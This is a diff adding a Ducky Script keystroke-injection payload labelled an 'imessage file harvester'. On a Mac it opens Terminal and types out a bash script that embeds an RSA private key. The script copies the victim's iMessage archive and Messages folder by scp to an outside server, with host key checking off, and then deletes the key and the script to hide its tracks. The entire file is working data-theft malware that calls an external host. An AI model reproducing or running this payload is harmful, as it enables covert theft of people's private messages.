@@ -1,0 +1,83 @@
+REM imessage file harvester 
+REM By Ashton Shears, using Naookie Sato's bash script
+DELAY 1200
+GUI SPACE
+STRING terminal 
+DELAY 1500
+ENTER 
+DELAY 500
+STRING rm ~/.harvester.sh.swp
+ENTER
+DELAY 50
+STRING rm ~/harvester.sh
+ENTER
+DELAY 50
+STRING vim ~/harvester.sh
+ENTER
+DELAY 500
+REM *****NOW TYPING BASH SCRIPT*****
+STRING i
+STRING ARCHIVE=~/Library/Containers/com.apple.iChat/Data/Library/Messages/Archive
+ENTER
+STRING MESSAGES=~/Library/Messages
+ENTER
+STRING SERV=www.naookiesato.com
+ENTER
+STRING SERVPORT=8087
+ENTER
+STRING SERVUSER=ms
+ENTER
+STRING SERVPATH=/home/ms/messages
+ENTER
+STRING KEY="-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA7RZyPnBFV3V5Lffo2m/YwsjrGLC0FTzsjwnXiCfYYkCHMjep\nZ5zzN94tDeXFRKWhL3OHXXxUKudgVgANmtQcBXKRx7R/bJRlhknUvpwHJ5giQOxy\nSKBb0TmIi0xsmQNTv6vxPjV9nrvLDdcJJuBaf0xeJv+cXv9pYU5TYgXvzIuIG5+m\nEoc+lwkoEYltXLDWF3vM5VaMcJSVeNSaQu5iHi9BDCVHNdluFPpufRi8xsI/CMlT\nGyNezdnOBUi4xCwL4BVqCMLbWLebJ+3oZZdDyWFHErSCMLrKSWn3Bd4NIjrWw46T\nvPlGzIkei8T16NbMvKuiDH9KE7GzHv8M4Mcb+QIDAQABAoIBAHORf3rkK0jooHtB\n3yWrY5P/cGoGqKG5ou5Os9tQ4O9z2PMnotI49W4ERR4DJNfDjQCeZhux4S1Qv+rr\n97XDMy2MnXcliv+YjqyZDLUlRW+NfxT6rPKuCFPCocaVKFKmBorl+6CBXoyjqeVD\nLtjef/6RcUu9SbIc+ndOQOMFVdD0OuPKOYND51EJvpSdJAtklvlNbuPOfYrM7gR4\n5d/OKXcRwY3eu/nrUrSgbHp7Ypk+1mMgFdMBIn4BkkJN+KdybYsJNuRUZGv+zUsq\nj+LB4qNptw6zEkAX5CISbDP1UdwW5MfkSEeQCOPnpZ+45jLE53qXpasgH3e6veC/\nn72WvAECgYEA9sWjmXjaLOIbbdSaiZf+pL1KqeIygr9e4gLE22uuIU8BQSdLjLCx\nUx0fEmzNVHkgpDNY/uT7EmT0cTHSNVnuyrZ3AyOCys6JQ/SHBy5uudO7RinELBi2\ntFIZgceK/EVsVU75Tr6+RpRz1MSBzacH5tiIeVu3UEeCYNOaVEw6CLkCgYEA9fQZ\nNT+8qKhvX5H1eLgsgh0LpeESflOj3UfQ7sWnKy3PQjueXZsq22OpaRYdDG5hCOhl\nHlHkffjmAGYoGfIXhNldgk4vX9rBVJKWcIjl61hzzZaG1rOW4C36Y/qxtQAPZGh5\nYY31YDCDmysz6oohIXvXH+Kw6Hk6KK0leXCljUECgYEAp9iGDj1FKIIiZfHVqwDX\nEvYtcp+H+6ZuwwtfGl+DcORr1gUEPg1wjzefisi2YF6C9Sx3u+fDXh+Mo/FfKSqi\nYP76tAfTTl5svuvza88JQRvipTaDV/r3Sm8NKlivECeoJ94vdIAIq7kNkAqYv2h8\n12cwbFsVtGTvKSzEK9ItJwECgYA7uyhUEkKTAzTpFN10j+XfQ4aMpniDTXTCTKql\nEkNi7SEkiK4RNZnW5gFCkChF2JigPTAxiNng7g2Nk0Gx62Vi0hcviiVfNhU1oNQA\nSH7uBPE6wI/GnJ7Lmt7wYPW/a2BRlj3EP2GUFrQffwKAt0MMirLX/4nPK4HAVyx+\nrajHAQKBgBzVs1KdlQsDNLoqDPc/StoOzj7CaYXmGrrDGODkeDRyUxRGD6b3Heku\nGlhQLbU0e6V7ATgftgAoGKCQaiwtIvm4/VpK7epTIk5Gp25vTaXmmXdolRgnx8Lj\n11yAr3T+4+MBN9HbbqipuhysqypSrMOAC4570iFeHPbHPjhlDy2I\n-----END RSA PRIVATE KEY-----"
+ENTER
+STRING KEYDIR=~/.msssh/
+ENTER
+STRING KEYPATH=~/.msssh/id_rsa
+ENTER
+STRING mkdir ${KEYDIR}
+ENTER
+STRING echo -e ${KEY} > ${KEYPATH}
+ENTER
+STRING chmod 400 ${KEYPATH}
+ENTER
+STRING cd ${ARCHIVE}
+ENTER
+STRING if [ $? -eq 0 ]; then
+ENTER
+STRING    ssh -i ${KEYPATH} -p ${SERVPORT} -o StrictHostKeyChecking=no ${SERVUSER}@${SERV} "mkdir ${SERVPATH}"
+ENTER
+STRING    ssh -i ${KEYPATH} -p ${SERVPORT} -o StrictHostKeyChecking=no ${SERVUSER}@${SERV} "mkdir ${SERVPATH}/${USER}"
+ENTER
+STRING    scp -i ${KEYPATH} -P ${SERVPORT} -o StrictHostKeyChecking=no -r ${ARCHIVE} ${SERVUSER}@${SERV}://${SERVPATH}/${USER}/
+ENTER
+STRING fi
+ENTER
+STRING cd ${MESSAGES}
+ENTER
+STRING if [ $? -eq 0 ]; then
+ENTER
+STRING    ssh -i ${KEYPATH} -p ${SERVPORT} -o StrictHostKeyChecking=no ${SERVUSER}@${SERV} "mkdir ${SERVPATH}"
+ENTER
+STRING    ssh -i ${KEYPATH} -p ${SERVPORT} -o StrictHostKeyChecking=no ${SERVUSER}@${SERV} "mkdir ${SERVPATH}/${USER}"
+ENTER
+STRING    scp -i ${KEYPATH} -P ${SERVPORT} -o StrictHostKeyChecking=no -r ${MESSAGES} ${SERVUSER}@${SERV}://${SERVPATH}/${USER}/
+ENTER
+STRING fi
+ENTER
+STRING rm -rf ${KEYDIR} #cleanup
+ESC
+DELAY 50
+STRING :wq
+ENTER
+DELAY 50
+STRING chmod +x ~/harvester.sh
+ENTER
+DELAY 50
+STRING time ~/harvester.sh
+ENTER
+STRING rm -rf ~/harvester.sh
+ENTER
+GUI q
+DELAY 10
+ENTER
